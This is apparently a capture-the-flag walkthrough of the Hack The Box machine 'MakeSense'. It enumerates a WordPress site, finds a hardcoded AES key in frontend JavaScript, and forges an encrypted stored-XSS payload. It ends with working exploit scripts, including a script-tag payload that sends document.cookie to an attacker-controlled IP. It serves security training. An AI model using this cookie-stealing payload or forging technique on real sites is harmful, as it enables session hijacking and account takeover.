# MakeSense

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.30.216

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/makesense_tcp.htb $ip
# 22/tcp  open  ssh
# 443/tcp open  https




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/makesense_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/makesense_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts and discover the website .**

{% code overflow="wrap" %}
```bash
echo "$ip makesense.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

**A wordpress app programming in PHP with mySQL in database**

&#x20;<mark style="color:blue;">**Step 3**</mark>

{% code overflow="wrap" %}
```bash
feroxbuster --url https://$target/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --insecure --no-recursion

# 400      GET        1l        1w        1c https://makesense.htb/wp-admin/admin-ajax.php

```
{% endcode %}

**While enumring the CMS**

**we found an exposed directorie**

[**https://makesense.htb/wp-content/uploads/**](https://makesense.htb/wp-content/uploads/)

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

[**https://makesense.htb/scripts/**](https://makesense.htb/scripts/)

**and also the XMLRPC endpoint thta can lead us to information disclore or DDOS**&#x20;

{% code overflow="wrap" %}
```bash
curl -sk -X POST https://$target/xmlrpc.php
└─# curl -sk -X POST https://$target/xmlrpc.php                                                                          
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```
{% endcode %}

**The admin endpoint**

[**https://makesense.htb/wp-admin/**<br>](https://makesense.htb/wp-admin/)

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

&#x20;<mark style="color:blue;">**Step 4**</mark>

**the transformers  ai-models  looks interesting**&#x20;

{% code overflow="wrap" %}
```bash
curl -sk https://makesense.htb/wp-content/ai-models/transformers/transformers.js > transformers.js
```
{% endcode %}

**the ai suggest to do a hard fuzzing on the ai-models that exist**

{% code overflow="wrap" %}
```bash
feroxbuster -u https://makesense.htb/wp-content/ai-models/ -k -x onnx,json,bin,txt,php --scan-dir-listings

https://makesense.htb/wp-content/ai-models/models/whisper-tiny.en/  # 301
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/special_tokens_map.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/generation_config.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/config.json # 200

https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/tokenizer_config.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/onnx/decoder_model_merged_quantized.onnx  # 200

https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/onnx/encoder_model_quantized.onnx
# 200
```
{% endcode %}

&#x20;**i analyze this files but i cant find anything interesting, we know tha WP-7 lets confirm it**&#x20;

{% code overflow="wrap" %}
```bash
curl -k https://$target/wp-links-opml.php | grep "WordPress"
# <!-- generator="WordPress/7.0" -->
```
{% endcode %}

<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
https://makesense.htb//.gitignore it give some informations
```
{% endcode %}

**after emunring all this and go on a rabbit hole  idsocver when i do an ai call and i register a request by audio it saved on the exposed uploaded directory**&#x20;

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

**so the main idea is webshell**

**it doesnt work so i switch to enumrate deeply**

{% code overflow="wrap" %}
```bash
curl -sk https://makesense.htb/ |  grep themes

# var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"f3142630f4","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};

feroxbuster -u https://makesense.htb/wp-content/themes/webagency/ -k -x onnx,json,bin,txt,php --scan-dir-listings

# 301      GET        9l       28w      345c https://makesense.htb/wp-content/themes/webagency/assets => https://makesense.htb/wp-content/themes/webagency/assets/
```
{% endcode %}

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

[https://makesense.htb/wp-content/themes/webagency/assets/js/main.js](https://makesense.htb/wp-content/themes/webagency/assets/js/main.js)

on the  [https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js](https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js)

i found the key that encrypt data&#x20;

{% code overflow="wrap" %}
```javascript
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

// Encrypt payload using AES-GCM
```
{% endcode %}

**Voice-to-Symbol Mapping (XSS Injection Vector)**

{% code overflow="wrap" %}
```javascript
applySymbolMapping(text) {
    // ...
    const mappings = {
        'open bracket': '<',
        'close bracket': '>',
        'bracket': '<', // Default single 'bracket' to opening
        'slash': '/',
        'back slash': '\\',
        'quote': "'",
        'double quote': '"',
        'open parenthesis': '(',
        'close parenthesis': ')',
        // ...
    };
    // ...
    // Clean up spaces around symbols
    result = result.replace(/\s*([<>\/()[\]{}.,:;=\-_+*&%$#!?])\s*/g, '$1');
    return result;
}
```
{% endcode %}

**Client-Side Trust & Lack of Output Encoding**

{% code overflow="wrap" %}
```javascript
// Combine IV + ciphertext (tag is appended automatically by WebCrypto)
const combined = new Uint8Array(iv.length + encrypted.byteLength);
combined.set(iv, 0);
combined.set(new Uint8Array(encrypted), iv.length);
// ...
return btoa(binary);
```
{% endcode %}

**The system relies on the frontend to encrypt the data, assuming that the server will decrypt it and trust its contents.**&#x48;**owever, because the key is public (Vulnerability #1), an attacker can forge any payload. If the server decrypts this data and renders it in the admin dashboard or frontend without proper HTML entity encoding (e.g., using `innerHTML` instead of `textContent`), the injected `<script>` tags will execute, leading to Stored XSS.**

**i start by encoding my payload using a script**

{% code overflow="wrap" %}
```python
import hashlib
import os
import base64
import json
from Crypto.Cipher import AES

# 1. Extracted from frontend code
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

# 2. The XSS payload (simulating the final output of applySymbolMapping)
# You can change this to any payload you want (e.g., stealing cookies, redirecting, etc.)
xss_payload = "<script>fetch('http://10.10.14.63:1234/?c='+document.cookie)</script>"

payload_data = {
    "transcription": xss_payload,
    "summary": xss_payload
}

# 3. Derive key using SHA-256 (matching WebCrypto API: crypto.subtle.digest('SHA-256', ...))
key_material = hashlib.sha256(ENCRYPTION_KEY.encode('utf-8')).digest()

# 4. Generate random IV (12 bytes for AES-GCM)
iv = os.urandom(12)

# 5. Encrypt using AES-GCM
cipher = AES.new(key_material, AES.MODE_GCM, nonce=iv)
ciphertext, tag = cipher.encrypt_and_digest(json.dumps(payload_data).encode('utf-8'))

# 6. Combine IV + ciphertext + tag (matching frontend logic)
combined = iv + ciphertext + tag

# 7. Base64 encode (matching frontend logic: btoa(binary))
encrypted_payload = base64.b64encode(combined).decode('utf-8')

print("[+] Successfully generated encrypted payload:\n")
print(encrypted_payload)
```
{% endcode %}

**exploit.py**

{% code overflow="wrap" %}
```python
import requests

url = "https://makesense.htb/wp-admin/admin-ajax.php"

# Replace these with values from a legitimate request you captured
VALID_NONCE = "f3142630f4"
VALID_POST_ID = "103"

data = {
    'action': 'save_voice_results',
    'nonce': VALID_NONCE,
    'post_id': VALID_POST_ID,
    'encrypted_payload': '<ENC>' # The output from the previous script
}

response = requests.post(url, data=data, verify=False)
print(response.status_code)
print(response.text)
```
{% endcode %}
